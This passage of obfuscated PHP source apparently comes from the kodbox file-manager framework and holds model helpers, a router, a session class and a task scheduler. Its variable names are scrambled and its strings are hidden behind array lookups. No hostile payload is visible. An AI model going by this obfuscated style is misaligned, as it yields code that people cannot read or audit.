$ÉµÊÌãŒ = is_string($Ë³¿êä£) ? $Ë³¿êä£ : $ÉµÊÌãŒ; $‰ïÆĞé = $this->parseWhereLike($‰ïÆĞé, $ÉµÊÌãŒ, !0, $¡®ÀáŞ); } if (is_numeric($Ë³¿êä£)) { $Ä£‰È¬ş[$Î‘ôÑ] = $‰ïÆĞé; $Î‘ôÑ++; } else { $Ä£‰È¬ş[$Ë³¿êä£] = $‰ïÆĞé; } } if ($¡®ÀáŞ && !$¶ÅşêÌ´) { } return $Ä£‰È¬ş; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ğ“Ûì«Ê = array()) { $£ŠüàŠ =& $_SERVER[äô®•½Â]; $¡¼ÖÌ‘ = self::SQL_WHERE_IN_CHUNK; $ûªâ—£í = $this->optionsValue(); $òÜş¢‰ = $this->findWhereField($ûªâ—£í); if (!$òÜş¢‰ || isset($ûªâ—£í[$£ŠüàŠ[379]]) || isset($ûªâ—£í[$£ŠüàŠ[439]])) { return parent::select($Ğ“Ûì«Ê); } $­ªŸ×óë = $ûªâ—£í[$£ŠüàŠ[364]][$òÜş¢‰][1]; $­ªŸ×óë = is_array($­ªŸ×óë) ? $­ªŸ×óë : array(); $­°§Ä·ä = null; for ($¸¼ªÌûˆ = 0; $¸¼ªÌûˆ < count($­ªŸ×óë); $¸¼ªÌûˆ += $¡¼ÖÌ‘) { $ŠìéÄğî = array_slice($­ªŸ×óë, $¸¼ªÌûˆ, $¡¼ÖÌ‘); if (!is_array($ŠìéÄğî) || count($ŠìéÄğî) == 0) { break; } $ûªâ—£í[$£ŠüàŠ[364]][$òÜş¢‰][1] = $ŠìéÄğî; $this->optionsValue($ûªâ—£í); $ˆğ„ÔÙÂ = parent::select($Ğ“Ûì«Ê); if (!$ˆğ„ÔÙÂ) { continue; } $­°§Ä·ä = is_array($­°§Ä·ä) ? $­°§Ä·ä : array(); $­°§Ä·ä = array_merge($­°§Ä·ä, $ˆğ„ÔÙÂ); } return $­°§Ä·ä; } public function delete($·ıºŞìÌ = array()) { $€”«Œ =& $_SERVER[äô®•½Â]; $ú´’¹‘Ñ = self::SQL_WHERE_IN_CHUNK; $ŒØ“Ç®Ê = $this->optionsValue(); $Ãò¿¥³‹ = $this->findWhereField($ŒØ“Ç®Ê); if (!$Ãò¿¥³‹) { return parent::delete($·ıºŞìÌ); } $·Ñøúà© = 0; $ÒÁ³„¢ = $ŒØ“Ç®Ê[$€”«Œ[364]][$Ãò¿¥³‹][1]; $ÒÁ³„¢ = is_array($ÒÁ³„¢) ? $ÒÁ³„¢ : array(); for ($©…‹õê˜ = 0; $©…‹õê˜ < count($ÒÁ³„¢); $©…‹õê˜ += $ú´’¹‘Ñ) { $—×—èèå = array_slice($ÒÁ³„¢, $©…‹õê˜, $ú´’¹‘Ñ); if (!is_array($—×—èèå) || count($—×—èèå) == 0) { break; } $ŒØ“Ç®Ê[$€”«Œ[364]][$Ãò¿¥³‹][1] = $—×—èèå; $this->optionsValue($ŒØ“Ç®Ê); $·Ñøúà© += parent::delete($·ıºŞìÌ); } return $·Ñøúà©; } private function findWhereField($ğ«¤‘‘ö) { $ìšÇÅà =& $_SERVER[äô®•½Â]; $äÕöÚ³û = self::SQL_WHERE_IN_CHUNK; if (!is_array($ğ«¤‘‘ö) || !is_array($ğ«¤‘‘ö[$ìšÇÅà[364]])) { return !1; } foreach ($ğ«¤‘‘ö[$ìšÇÅà[364]] as $Çéô…ã‘ => $¬ûì¢ÂÁ) { if (is_array($¬ûì¢ÂÁ) && isset($¬ûì¢ÂÁ[0]) && is_string($¬ûì¢ÂÁ[0]) && strtolower($¬ûì¢ÂÁ[0]) == $ìšÇÅà[7] && is_array($¬ûì¢ÂÁ[1]) && count($¬ûì¢ÂÁ[1]) > $äÕöÚ³û) { ignore_timeout(); return $Çéô…ã‘; } } return !1; } public function setMasterDB($·÷ÈóØ† = true) { think_config($_SERVER[äô®•½Â][482], $·÷ÈóØ†); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($È¹„éúä = false, $Ô’¯•Šá = "\155\157\144\151\146\x79\x54\x69\155\x65", $ü–‹ƒâ = false) { $Ç†í¯ = Model($this->modelType)->get(!1, $this->optionType, !0); $éçñÔ = array_values($Ç†í¯); if ($éçñÔ && $éçñÔ[0] && !is_array($éçñÔ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ç†í¯ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ç†í¯) { return $È¹„éúä ? null : array(); } if (!$È¹„éúä) { $Ç†í¯ = array_filter(array_values($Ç†í¯)); return array_sort_by($Ç†í¯, $Ô’¯•Šá, $ü–‹ƒâ); } return $Ç†í¯[$_SERVER[äô®•½Â][483] . $È¹„éúä]; } public function insert($ñº±’å) { $Ìµ»Ó‚ç =& $_SERVER[äô®•½Â]; $ñº±’å = array_field_key($ñº±’å, $this->field); $àüËµ½ = Model($this->modelType)->get($Ìµ»Ó‚ç[484], $this->optionType . $Ìµ»Ó‚ç[485]); $àüËµ½ = $àüËµ½ ? $àüËµ½ : 0; $ñº±’å[$Ìµ»Ó‚ç[486]] = ++$àüËµ½; $ñº±’å[$Ìµ»Ó‚ç[234]] = time(); $ñº±’å[$Ìµ»Ó‚ç[88]] = time(); Model($this->modelType)->set($Ìµ»Ó‚ç[484], $àüËµ½, $this->optionType . $Ìµ»Ó‚ç[485]); Model($this->modelType)->set($Ìµ»Ó‚ç[483] . $àüËµ½, $ñº±’å, $this->optionType); return $àüËµ½; } public function update($ëÑ´Ö, $ ¬ïØ†´) { $¹Ì’Éæ— =& $_SERVER[äô®•½Â]; $ ¬ïØ†´ = array_field_key($ ¬ïØ†´, $this->field); $ŸáÆ ã÷ = $this->listData($ëÑ´Ö); if (!$ŸáÆ ã÷ || !$ëÑ´Ö) { return !1; } $ ¬ïØ†´ = array_merge($ŸáÆ ã÷, $ ¬ïØ†´); $ ¬ïØ†´[$¹Ì’Éæ—[88]] = time(); return Model($this->modelType)->set($¹Ì’Éæ—[483] . $ëÑ´Ö, $ ¬ïØ†´, $this->optionType); } public function remove($é­­ª’–) { if (!$é­­ª’–) { return !1; } return Model($this->modelType)->remove($_SERVER[äô®•½Â][483] . $é­­ª’–, $this->optionType); } public function clear() { $‡È®â°© =& $_SERVER[äô®•½Â]; Model($this->modelType)->remove($‡È®â°©[484], $this->optionType . $‡È®â°©[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($õìíû, $Í××­ğ³) { if (!$Í××­ğ³) { return !1; } $¨—¶²Œ = $this->listData(); $¨—¶²Œ = array_to_keyvalue($¨—¶²Œ, $õìíû); return isset($¨—¶²Œ[$Í××­ğ³]) ? $¨—¶²Œ[$Í××­ğ³] : !1; } public function findByName($ùûœ»°) { return $this->findByKey($_SERVER[äô®•½Â][32], $ùûœ»°); } protected function resetData($ÒËÁÔäş) { $€öÔŠŞ„ =& $_SERVER[äô®•½Â]; $ÒËÁÔäş = is_array($ÒËÁÔäş) ? $ÒËÁÔäş : array(); $¸é´ä¦“ = array(); for ($ÊïéœÖæ = 0; $ÊïéœÖæ < count($ÒËÁÔäş); $ÊïéœÖæ++) { $¸é´ä¦“[$€öÔŠŞ„[483] . $ÒËÁÔäş[$ÊïéœÖæ][$€öÔŠŞ„[486]]] = $ÒËÁÔäş[$ÊïéœÖæ]; } return Model($this->modelType)->set($¸é´ä¦“, !1, $this->optionType); } private function getAutoName($´³¿ô…) { $ò…¸Å¿Ğ = array_to_keyvalue($this->listData(), $_SERVER[äô®•½Â][32]); if (!$ò…¸Å¿Ğ || !isset($ò…¸Å¿Ğ[$´³¿ô…])) { return $´³¿ô…; } for ($§è‡åšã = 1; $§è‡åšã < count($ò…¸Å¿Ğ); $§è‡åšã++) { $ŠÛ½Ê¡ñ = $´³¿ô… . "\50{$§è‡åšã}\51"; if (!isset($ò…¸Å¿Ğ[$ŠÛ½Ê¡ñ])) { return $ŠÛ½Ê¡ñ; } } return $ŠÛ½Ê¡ñ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($†ışÑ­µ = false, $öü¾Ü‡î = '', $Õ’¾™Ï = false) { $¦ã·¾Â¦ =& $_SERVER[äô®•½Â]; $öåöÖ©ë = $this->cacheGet($öü¾Ü‡î); $€¨¿äòñ = $this->optionDefault($öü¾Ü‡î); $€¨¿äòñ = is_array($€¨¿äòñ) ? $€¨¿äòñ : array(); if (is_array($öåöÖ©ë)) { $öåöÖ©ë = array_merge($€¨¿äòñ, $öåöÖ©ë); return $†ışÑ­µ ? isset($öåöÖ©ë[$†ışÑ­µ]) ? $öåöÖ©ë[$†ışÑ­µ] : null : $öåöÖ©ë; } $¾ñÖÈ’Ğ = $this->filterWhere(array($¦ã·¾Â¦[33] => $öü¾Ü‡î)); $öåöÖ©ë = $this->where($¾ñÖÈ’Ğ)->select(); $öåöÖ©ë = array_to_keyvalue($öåöÖ©ë, $¦ã·¾Â¦[97], $¦ã·¾Â¦[461]); foreach ($öåöÖ©ë as $ŞÇ‡ÅéÒ => $Åå¾ï”) { if ($Õ’¾™Ï || in_array($ŞÇ‡ÅéÒ, $this->jsonField)) { $öåöÖ©ë[$ŞÇ‡ÅéÒ] = json_decode($Åå¾ï”, !0); } } $this->cacheSet($öü¾Ü‡î, $öåöÖ©ë); $öåöÖ©ë = array_merge($€¨¿äòñ, $öåöÖ©ë); return $†ışÑ­µ ? $öåöÖ©ë[$†ışÑ­µ] : $öåöÖ©ë; } public function set($ÜõŒ¥æ›, $÷¦ÄºüÄ = false, $û¼†±¥ = '') { $×¦Ôµ³¦ =& $_SERVER[äô®•½Â]; $this->cacheRemove($û¼†±¥); $Èí¨áÃ = array(); $ñ¥ÇÕòë = is_array($ÜõŒ¥æ›) ? $ÜõŒ¥æ› : array($ÜõŒ¥æ› => $÷¦ÄºüÄ); foreach ($ñ¥ÇÕòë as $òúëÉ° => $£—±Ù·) { if (is_array($£—±Ù·)) { $£—±Ù· = json_encode_force($£—±Ù·); } $this->checkLength($£—±Ù·, !1, $this->tableName . $×¦Ôµ³¦[4] . $ÜõŒ¥æ›); $£—±Ù· = self::textEncode($£—±Ù·); $ñ¥ÇÕòë = array($×¦Ôµ³¦[33] => $û¼†±¥, $×¦Ôµ³¦[97] => $òúëÉ°, $×¦Ôµ³¦[461] => $£—±Ù·); $Èí¨áÃ[] = $this->filterWhere($ñ¥ÇÕòë); } if (!$Èí¨áÃ) { return !0; } $ŒÙ˜àÖƒ = $this->cacheKey($×¦Ôµ³¦[487]); CacheLock::lock($ŒÙ˜àÖƒ); $Üìñëè¿ = $this->addAll($Èí¨áÃ, array(), !0); CacheLock::unlock($ŒÙ˜àÖƒ); return $Üìñëè¿; } protected function optionDefault($ÕªÍË’¼ = '') { return !1; } public function setDeep($ÃŸÊŸÎ, $¯†ñšôñ = false, $¾¾ïÊ–¡ = '') { $ãà·¡çô = explode($_SERVER[äô®•½Â][10], $ÃŸÊŸÎ); $ç›¡úÉÙ = $this->get(); array_set_value($ç›¡úÉÙ, $ÃŸÊŸÎ, $¯†ñšôñ); $this->set($ãà·¡çô[0], $ç›¡úÉÙ[$ãà·¡çô[0]], $¾¾ïÊ–¡); } public function remove($ÜÊÃÜÕÎ, $’³Õ²° = '') { $Ÿã³—ŞÔ =& $_SERVER[äô®•½Â]; $this->cacheRemove($’³Õ²°); $¦ÑÇƒ‚ = $this->filterWhere(array($Ÿã³—ŞÔ[97] => $ÜÊÃÜÕÎ, $Ÿã³—ŞÔ[33] => $’³Õ²°)); if (is_null($ÜÊÃÜÕÎ)) { unset($¦ÑÇƒ‚[$Ÿã³—ŞÔ[97]]); } return $this->where($¦ÑÇƒ‚)->delete(); } public function cacheSet($Ä¨õìüĞ, $ã¤ò©— = false) { return Cache::set($this->cacheKey($Ä¨õìüĞ), $ã¤ò©—); } public function cacheGet($ˆïœŞ) { return Cache::get($this->cacheKey($ˆïœŞ)); } public function cacheRemove($½÷‡éÛ) { return Cache::remove($this->cacheKey($½÷‡éÛ)); } protected function filterWhere($òäï¥«£) { return $òäï¥«£; } protected function cacheKey($¹œ÷»µş) { return $¹œ÷»µş; } } goto c®áÃ£Œğ„; C¿Ë¡‚»æ–: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\x5e\x2f\x5d\x2b", "\x3a\x6e\x75\x6d" => "\x5b\60\55\x39\135\53", "\x3a\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($íîèìÏì, $ŒñÜáÛ…) { $š«¹­„Ù =& $_SERVER[äô®•½Â]; if ($íîèìÏì == $š«¹­„Ù[1712]) { $Ï´ˆºüË = array_map($š«¹­„Ù[1713], $ŒñÜáÛ…[0]); $Ö²›ô = strpos($ŒñÜáÛ…[1], $š«¹­„Ù[8]) === 0 ? $ŒñÜáÛ…[1] : $š«¹­„Ù[8] . $ŒñÜáÛ…[1]; $±šÎÅ¯¦ = $ŒñÜáÛ…[2]; } else { $Ï´ˆºüË = null; $Ö²›ô = strpos($ŒñÜáÛ…[0], $š«¹­„Ù[8]) === 0 ? $ŒñÜáÛ…[0] : $š«¹­„Ù[8] . $ŒñÜáÛ…[0]; $±šÎÅ¯¦ = $ŒñÜáÛ…[1]; } array_push(self::$maps, $Ï´ˆºüË); array_push(self::$routes, $Ö²›ô); array_push(self::$methods, strtoupper($íîèìÏì)); array_push(self::$callbacks, $±šÎÅ¯¦); } public static function error($¯Ğ¤ŸÄ§) { self::$errorCallback = $¯Ğ¤ŸÄ§; } public static function haltOnMatch($ÇúÕÊÇõ = true) { self::$halts = $ÇúÕÊÇõ; } public static function dispatch() { $íöÖâ“ =& $_SERVER[äô®•½Â]; $ÒÄ¸Ç’ = parse_url($_SERVER[$íöÖâ“[1714]], PHP_URL_PATH); $ŸĞæºú = $_SERVER[$íöÖâ“[164]]; $‚ÂÛåœƒ = array_keys(static::$patterns); $÷±ÁŠ¸ = array_values(static::$patterns); $˜à®ê© = !1; self::$routes = preg_replace($íöÖâ“[1359], $íöÖâ“[8], self::$routes); if (in_array($ÒÄ¸Ç’, self::$routes)) { $İ§ÇÉúõ = array_keys(self::$routes, $ÒÄ¸Ç’); foreach ($İ§ÇÉúõ as $ƒıÁ¯îû) { if (self::$methods[$ƒıÁ¯îû] == $ŸĞæºú || self::$methods[$ƒıÁ¯îû] == $íöÖâ“[1715] || in_array($ŸĞæºú, self::$maps[$ƒıÁ¯îû])) { $˜à®ê© = !0; if (!is_object(self::$callbacks[$ƒıÁ¯îû])) { $ùé×ãµ™ = explode($íöÖâ“[8], self::$callbacks[$ƒıÁ¯îû]); $ïÕ½ŒÈ = end($ùé×ãµ™); $½Ò±ëÃè = explode($íöÖâ“[1291], $ïÕ½ŒÈ); $ÑªÚ°Ï = new $½Ò±ëÃè[0](); $ÑªÚ°Ï->{$½Ò±ëÃè[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ƒıÁ¯îû]); if (self::$halts) { return; } } } } } else { $Ó¡äüìØ = 0; foreach (self::$routes as $ƒıÁ¯îû) { if (strpos($ƒıÁ¯îû, $íöÖâ“[4]) !== !1) { $ƒıÁ¯îû = str_replace($‚ÂÛåœƒ, $÷±ÁŠ¸, $ƒıÁ¯îû); } if (preg_match($íöÖâ“[1716] . $ƒıÁ¯îû . $íöÖâ“[1717], $ÒÄ¸Ç’, $ºÁƒ¢‹´)) { if (self::$methods[$Ó¡äüìØ] == $ŸĞæºú || self::$methods[$Ó¡äüìØ] == $íöÖâ“[1715] || !empty(self::$maps[$Ó¡äüìØ]) && in_array($ŸĞæºú, self::$maps[$Ó¡äüìØ])) { $˜à®ê© = !0; array_shift($ºÁƒ¢‹´); if (!is_object(self::$callbacks[$Ó¡äüìØ])) { $ùé×ãµ™ = explode($íöÖâ“[8], self::$callbacks[$Ó¡äüìØ]); $ïÕ½ŒÈ = end($ùé×ãµ™); $½Ò±ëÃè = explode($íöÖâ“[1291], $ïÕ½ŒÈ); $ÑªÚ°Ï = new $½Ò±ëÃè[0](); if (!method_exists($ÑªÚ°Ï, $½Ò±ëÃè[1])) { echo $íöÖâ“[1718]; } else { call_user_func_array(array($ÑªÚ°Ï, $½Ò±ëÃè[1]), $ºÁƒ¢‹´); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ó¡äüìØ], $ºÁƒ¢‹´); if (self::$halts) { return; } } } } $Ó¡äüìØ++; } } if ($˜à®ê© == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ĞÛ…œÁ =& $_SERVER[äô®•½Â]; header($_SERVER[$ĞÛ…œÁ[1719]] . $ĞÛ…œÁ[1720]); echo $ĞÛ…œÁ[1721]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$íöÖâ“[1714]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $÷ˆ‰õ¶Ğ =& $_SERVER[äô®•½Â]; static $°¬¬Ç½» = false; if ($°¬¬Ç½») { return $°¬¬Ç½»; } $ó˜¶î“° = $GLOBALS[$÷ˆ‰õ¶Ğ[6]][$÷ˆ‰õ¶Ğ[435]]; self::$sessionTime = $ó˜¶î“°[$÷ˆ‰õ¶Ğ[1722]]; $Šûöå¡é = isset($GLOBALS[$÷ˆ‰õ¶Ğ[1723]]) ? $GLOBALS[$÷ˆ‰õ¶Ğ[1723]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Šûöå¡é)) { self::$sessionSign = Cookie::get($Šûöå¡é); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Šûöå¡é, self::$sessionSign, self::$sessionTime); $ıË´•ü = $ó˜¶î“°[$÷ˆ‰õ¶Ğ[1724]]; $Æìœ·¸Œ = $ó˜¶î“°[$ıË´•ü]; $Ì™íÏ¤¸ = $ó˜¶î“°[$÷ˆ‰õ¶Ğ[899]]; switch ($ıË´•ü) { case $÷ˆ‰õ¶Ğ[21]: self::$handle = Model($÷ˆ‰õ¶Ğ[900]); break; case $÷ˆ‰õ¶Ğ[901]: self::$handle = new CacheRedis($Æìœ·¸Œ, $Ì™íÏ¤¸); break; case $÷ˆ‰õ¶Ğ[902]: self::$handle = new CacheMemcached($Æìœ·¸Œ, $Ì™íÏ¤¸); break; case $÷ˆ‰õ¶Ğ[233]: $Æìœ·¸Œ[$÷ˆ‰õ¶Ğ[87]] = $Æìœ·¸Œ[$÷ˆ‰õ¶Ğ[87]] . $÷ˆ‰õ¶Ğ[1725]; self::$handle = new CacheFile($Æìœ·¸Œ, $Ì™íÏ¤¸); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $°¬¬Ç½» = new self(); return $°¬¬Ç½»; } public static function getBySign($úÛÀäÌÒ) { $ù±±¸ ¿ = self::$handle->get($úÛÀäÌÒ); $ù±±¸ ¿ = unserialize($ù±±¸ ¿); return is_array($ù±±¸ ¿) ? $ù±±¸ ¿ : array(); } public static function setBySign($Îá–®¶í, $­™ÏÑó³) { CacheLock::lock($Îá–®¶í); self::$handle->set($Îá–®¶í, serialize($­™ÏÑó³), self::$sessionTime); CacheLock::unlock($Îá–®¶í); } public static function sign($ôŒ­…ç¤ = false) { if ($ôŒ­…ç¤) { self::$sessionSign = $ôŒ­…ç¤; } self::init(); return self::$sessionSign; } public static function set($¯ ÖÖÎø, $œóÜ‰ò = false) { self::init(); if (is_array($¯ ÖÖÎø)) { foreach ($¯ ÖÖÎø as $ì£šš™ => $ì±¹Îã) { array_set_value(self::$data, $ì£šš™, $ì±¹Îã); } } else { array_set_value(self::$data, $¯ ÖÖÎø, $œóÜ‰ò); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Úº˜ÎÌ« = false) { self::init(); if (!$Úº˜ÎÌ«) { return self::$data; } return array_get_value(self::$data, $Úº˜ÎÌ«); } public static function remove($Ş®ê—Ğ») { self::init(); unset(self::$data[$Ş®ê—Ğ»]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[äô®•½Â][905])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $éßœßÜ§ =& $_SERVER[äô®•½Â]; if (self::valueGet($éßœßÜ§[815]) != $éßœßÜ§[91]) { return; } if (self::valueGet($éßœßÜ§[1726]) == $éßœßÜ§[91]) { $²“÷èûı = self::valueGet($éßœßÜ§[1727]); if (time() - $²“÷èûı > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($éßœßÜ§[1726], $éßœßÜ§[91]); self::log($éßœßÜ§[1728] . ACTION . $éßœßÜ§[1729]); Hook::bind($éßœßÜ§[1730], $éßœßÜ§[1731]); $Ä†‚û¹  = 0; while (!0) { self::cacheClear(); if (self::valueGet($éßœßÜ§[815]) != $éßœßÜ§[91]) { self::valueSet($éßœßÜ§[1726], $éßœßÜ§[231]); self::log($éßœßÜ§[1732]); die; } $±ÉÎæ±˜ = time(); if ($±ÉÎæ±˜ - $Ä†‚û¹  >= 60) { self::valueSet(array($éßœßÜ§[1726] => $éßœßÜ§[91], $éßœßÜ§[1727] => $±ÉÎæ±˜)); $Ä†‚û¹  = $±ÉÎæ±˜; } if (!file_exists(USER_SYSTEM . $éßœßÜ§[1733])) { self::valueSet(array($éßœßÜ§[1726] => $éßœßÜ§[231], $éßœßÜ§[815] => $éßœßÜ§[231])); self::log($éßœßÜ§[1734]); die; } $ãº¡ŠÓ¥ = file_get_contents(BASIC_PATH . $éßœßÜ§[1735]); $ºôÅ¿“ = KOD_VERSION . $éßœßÜ§[10] . KOD_VERSION_BUILD; $½³…Ã¡¥ = match_text($ãº¡ŠÓ¥, $éßœßÜ§[1736]) . $éßœßÜ§[10] . match_text($ãº¡ŠÓ¥, $éßœßÜ§[1737]); if ($½³…Ã¡¥ != $ºôÅ¿“) { self::restart(); self::log("\x73\164\157\160\x65\x64\56\x5b\166\145\x72\163\151\157\x6e\x20\165\x70\144\141\x74\145\73{$versionNow}\x20\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ïô¦«¬² =& $_SERVER[äô®•½Â]; http_close(); $GLOBALS[$Ïô¦«¬²[1738]] = 1; $_SERVER[$Ïô¦«¬²[1739]] = $Ïô¦«¬²[1740]; $_COOKIE = array(); $GLOBALS[$Ïô¦«¬²[1741]] = 1; $GLOBALS[$Ïô¦«¬²[1742]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ì¨ƒñÕ =& $_SERVER[äô®•½Â]; http_close(); self::valueSet($ì¨ƒñÕ[815], $ì¨ƒñÕ[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ì¨ƒñÕ[1726] => $ì¨ƒñÕ[231], $ì¨ƒñÕ[815] => $ì¨ƒñÕ[91])); self::log($ì¨ƒñÕ[1743]); } public static function taskSwitch() { $¹×À˜³ =& $_SERVER[äô®•½Â]; $â–Ÿ’ş£ = self::valueGet($¹×À˜³[815]) == $¹×À˜³[91] ? $¹×À˜³[231] : $¹×À˜³[91]; self::valueSet($¹×À˜³[815], $â–Ÿ’ş£); } public static function shutdownEvent() { $ÄÇêç¬õ =& $_SERVER[äô®•½Â]; self::valueSet($ÄÇêç¬õ[1726], $ÄÇêç¬õ[231]); self::log($ÄÇêç¬õ[1744]); } public static function config($Ëë§–™Æ, $”à´Ù»—) { self::valueSet($_SERVER[äô®•½Â][815], $Ëë§–™Æ); } private static function taskRunAll() { $¯½øúâ‹ =& $_SERVER[äô®•½Â]; $„šİÎ«Ã = timeFloat(); $Òä­ÔşÍ = Model($¯½øúâ‹[1745])->listData(); $Àû­æãà = count($Òä­ÔşÍ); for ($æª£†á« = 0; $æª£†á« < $Àû­æãà; $æª£†á«++) { $¼ÆüšŞÚ = $Òä­ÔşÍ[$æª£†á«]; if (!$¼ÆüšŞÚ[$¯½øúâ‹[486]] || $¼ÆüšŞÚ[$¯½øúâ‹[1746]] != $¯½øúâ‹[91]) { continue; } if (!self::taskTimeCheck($¼ÆüšŞÚ)) { continue; } self::taskRun($¼ÆüšŞÚ); } Hook::trigger($¯½øúâ‹[1747]); self::taskQueueRun($„šİÎ«Ã); } private static function taskQueueRun($Ïøéá’ï) { $ŒŞğş¼ = 10; while (!0) { $”œ‘ÈÚÜ = TaskQueue::run(); if ($”œ‘ÈÚÜ === !1) { break; } if (timeFloat() - $Ïøéá’ï >= $ŒŞğş¼) { break; } } } private static function taskTimeCheck($õ­êùïú) { $ıİ¶ış =& $_SERVER[äô®•½Â]; $˜¹ØŸ¹® = json_decode($õ­êùïú[$ıİ¶ış[207]], !0); $ØéÄ“Ê× = intval($õ­êùïú[$ıİ¶ış[1727]]); $ó÷ËçØ = strtotime($ıİ¶ış[1748] . $˜¹ØŸ¹®[$ıİ¶ış[1749]] . $ıİ¶ış[1750]) - strtotime($ıİ¶ış[1751]); $´ü¦ôè = time() - strtotime(date($ıİ¶ış[1752]) . $ıİ¶ış[1753]); $…å±ûÁ = $´ü¦ôè >= $ó÷ËçØ && $´ü¦ôè <= $ó÷ËçØ + 3600; switch ($˜¹ØŸ¹®[$ıİ¶ış[33]]) { case $ıİ¶ış[1754]: if (time() - $ØéÄ“Ê× < 3600 * 24 * 30) { return !1; } if ($˜¹ØŸ¹®[$ıİ¶ış[1754]] == date($ıİ¶ış[1755]) && $…å±ûÁ) { return !0; } break; case $ıİ¶ış[1756]: if (time() - $ØéÄ“Ê× < 3600 * 24 * 7) { return !1; } $Æ‹éŸ¾ = date($ıİ¶ış[1757]) == 0 ? 7 : date($ıİ¶ış[1757]); if ($˜¹ØŸ¹®[$ıİ¶ış[1756]] == $Æ‹éŸ¾ && $…å±ûÁ) { return !0; } break; case $ıİ¶ış[1749]: if (time() - $ØéÄ“Ê× < 3600 * 24) { return !1; } if ($…å±ûÁ) { return !0; } break; case $ıİ¶ış[1758]: if (time() - $ØéÄ“Ê× >= floatval($˜¹ØŸ¹®[$ıİ¶ış[1758]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ úÒ•ŠÃ =& $_SERVER[äô®•½Â]; static $ß³’ä‰ã = 0; $óîÍ­° = 300; if (!$ß³’ä‰ã) { $ß³’ä‰ã = time(); } if (time() - $ß³’ä‰ã < $óîÍ­°) { return; } $ß³’ä‰ã = time(); $€“¾ƒ = Model($ úÒ•ŠÃ[590])->db($ úÒ•ŠÃ[12]); if ($€“¾ƒ) { $€“¾ƒ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ úÒ•ŠÃ[1759], $ úÒ•ŠÃ[1760]); die; } } public static function taskRun($›²Š¨Š¢) { $çĞ¬ª†‰ =& $_SERVER[äô®•½Â]; self::log($çĞ¬ª†‰[1761] . $›²Š¨Š¢[$çĞ¬ª†‰[486]] . $çĞ¬ª†‰[1762] . $›²Š¨Š¢[$çĞ¬ª†‰[32]] . $çĞ¬ª†‰[1763] . $›²Š¨Š¢[$çĞ¬ª†‰[1764]]); Model($çĞ¬ª†‰[1745])->run($›²Š¨Š¢[$çĞ¬ª†‰[486]]); $ççÄµÈ™ = timeFloat(); $‚šà°» = $çĞ¬ª†‰[12]; switch ($›²Š¨Š¢[$çĞ¬ª†‰[33]]) { case $çĞ¬ª†‰[393]: $ŠÃçœŸ = url_request($›²Š¨Š¢[$çĞ¬ª†‰[1764]], $çĞ¬ª†‰[1501], !1, !1, !1, !1, 10); if ($ŠÃçœŸ[$çĞ¬ª†‰[815]]) { $‚šà°» = strlen($ŠÃçœŸ[$çĞ¬ª†‰[1285]]); } break; case $çĞ¬ª†‰[1765]: $‚šà°» = Hook::apply($›²Š¨Š¢[$çĞ¬ª†‰[1764]]); default: break; } Model($çĞ¬ª†‰[1766])->add(array($çĞ¬ª†‰[1767] => $çĞ¬ª†‰[12], $çĞ¬ª†‰[1768] => $çĞ¬ª†‰[231], $çĞ¬ª†‰[33] => $çĞ¬ª†‰[1769] . $›²Š¨Š¢[$çĞ¬ª†‰[486]], $çĞ¬ª†‰[1770] => json_encode(array($çĞ¬ª†‰[32] => $›²Š¨Š¢[$çĞ¬ª†‰[32]], $çĞ¬ª†‰[1771] => timeFloat() - $ççÄµÈ™, $çĞ¬ª†‰[821] => $‚šà°»)))); $óàïÃ¼ = $‚šà°» ? $çĞ¬ª†‰[1772] . $‚šà°» : $çĞ¬ª†‰[12]; self::log($çĞ¬ª†‰[1773] . $›²Š¨Š¢[$çĞ¬ª†‰[486]] . $çĞ¬ª†‰[178] . $óàïÃ¼); return !0; } public static function valueGet($¶Á¤€×) { $”€ç” =& $_SERVER[äô®•½Â]; $ñË—ğ = $”€ç”[1774]; $¯øĞ²Ê› = Model($”€ç”[519])->get($¶Á¤€×, $ñË—ğ); if (is_null($¯øĞ²Ê›)) { Model($”€ç”[519])->set($”€ç”[815], $”€ç”[91], $ñË—ğ); Model($”€ç”[519])->set($”€ç”[1726], $”€ç”[231], 